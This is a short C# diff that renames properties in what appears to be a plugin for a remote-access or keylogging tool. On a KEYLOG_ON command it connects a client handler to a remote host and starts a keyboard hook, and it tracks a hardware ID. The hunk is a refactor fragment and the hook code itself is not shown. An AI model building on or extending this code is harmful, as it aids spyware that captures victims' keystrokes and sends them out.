@@ -18,14 +18,14 @@ namespace Plugin
         internal static string HWID;
         public static void Main(LoadingAPI loadingAPI)
         {
-            Launch.key = loadingAPI.key;
-            Launch.baseIp = loadingAPI.baseIp;
+            Launch.key = loadingAPI.Key;
+            Launch.baseIp = loadingAPI.BaseIp;
             Launch.HWID = loadingAPI.HWID;
 
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
                 case PacketType.KEYLOG_ON:
-                    clientHandler = new ClientHandler(loadingAPI.host, key);
+                    clientHandler = new ClientHandler(loadingAPI.Host, key);
                     clientHandler.ConnectStart();
                     KeyLib.Hook.StartHooking();
                     break;
